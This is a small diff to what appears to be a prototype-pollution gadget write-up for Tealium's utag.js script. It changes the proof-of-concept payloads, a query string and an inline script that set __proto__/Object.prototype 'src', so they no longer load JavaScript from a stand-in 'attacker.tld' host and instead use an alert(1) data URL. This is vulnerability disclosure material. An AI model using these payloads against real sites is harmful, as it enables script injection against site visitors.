@@ -69,13 +69,13 @@ https://tags.tiqcdn.com/utag/tealium-solutions/main/prod/utag.js
 
 ### PoC
 ```
-?__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js
+?__proto__[attrs][src]=1&__proto__[src]=data:,alert(1)//
 ```
 
 ```html
 <script>
   Object.prototype.attrs = {src:1}
-  Object.prototype.src='https://attacker.tld/js.js'
+  Object.prototype.src='data:,alert(1)//'
 </script>
 <script src=https://tags.tiqcdn.com/utag/tealium-solutions/main/prod/utag.js></script>
 ```
